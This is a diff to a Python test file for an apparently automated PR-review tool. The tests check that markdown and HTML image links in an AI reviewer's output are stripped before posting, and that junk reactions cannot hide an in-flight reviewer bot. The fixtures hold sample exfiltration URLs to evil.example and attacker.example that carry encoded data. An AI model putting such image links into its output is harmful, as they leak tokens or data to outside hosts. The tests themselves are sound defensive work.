@@ -26,6 +26,7 @@ from products.stamphog.backend.temporal.activities import (
     MarkReviewFailedInput,
     StamphogReviewInput,
     dismiss_stale_approvals,
+    list_in_flight_reviewer_bots,
     mark_review_failed,
     post_verdict,
 )
@@ -449,7 +450,8 @@ def test_reviewer_markdown_images_are_neutralized_before_posting(team, stamphog_
     recorder.register_pr(REPO, 114, _pr_object(114, "devex-dev", head_sha), _pr_files())
     engine_payload = json.loads(fakes.approved_engine_output().splitlines()[-1])
     engine_payload["review_body"] = (
-        'Looks fine. ![exfil](https://evil.example/aGVsbG8=) and <img src="https://evil.example/x"> end.'
+        'Looks fine. ![exfil](https://evil.example/aGVsbG8=) and <img src="https://evil.example/x"> '
+        "plus a reference-style one ![x][leak]\n\n[leak]: https://attacker.example/dG9rZW4=\n\nend."
     )
     pull_request = PullRequest.objects.for_team(team.id).create(
         team_id=team.id, repo_config=repo_config, pr_number=114, author_login="devex-dev"
@@ -466,9 +468,35 @@ def test_reviewer_markdown_images_are_neutralized_before_posting(team, stamphog_
 
     approvals = [w for w in recorder.github_writes if w["kind"] == "approve_review"]
     body = approvals[0]["body"]["body"]
-    assert "evil.example" not in body
+    assert "evil.example" not in body  # inline image and <img> URLs are removed outright
     assert body.count("[image removed]") == 2
+    assert "![" not in body  # reference-style images are demoted to plain links (never auto-fetched)
+    assert "[x][leak]" in body
     assert body.startswith("Looks fine.") and body.endswith("end.")
+
+
+@pytest.mark.django_db(databases=PRODUCT_DATABASES)
+def test_bot_eyes_on_a_later_reactions_page_still_counts_as_in_flight(team, stamphog_chain: StamphogChain) -> None:
+    # Anyone can react on a public PR, so an author could bury the trusted bot's fresh 👀 past the
+    # first page with junk reactions; a first-page-only fetch would treat the bot as absent and let
+    # stamphog approve while that reviewer is still mid-review.
+    repo_config = _repo_config(team.id)
+    pull_request = PullRequest.objects.for_team(team.id).create(
+        team_id=team.id, repo_config=repo_config, pr_number=115, author_login="devex-dev"
+    )
+    run = ReviewRun.objects.for_team(team.id).create(
+        team_id=team.id, pull_request=pull_request, head_sha="sha115a", status=ReviewRunStatus.QUEUED
+    )
+    now_iso = timezone.now().strftime("%Y-%m-%dT%H:%M:%SZ")
+    junk = [{"user": {"login": f"rando-{i}"}, "content": "heart", "created_at": now_iso} for i in range(100)]
+    eyes = {"user": {"login": "greptile-apps[bot]"}, "content": "eyes", "created_at": now_iso}
+    stamphog_chain.recorder.pr_reactions[(REPO, 115)] = [*junk, eyes]
+
+    result = _run_activity(
+        list_in_flight_reviewer_bots, StamphogReviewInput(review_run_id=str(run.id), team_id=team.id)
+    )
+
+    assert result["in_flight"] == ["greptile-apps[bot]"]
 
 
 @pytest.mark.django_db(databases=PRODUCT_DATABASES)
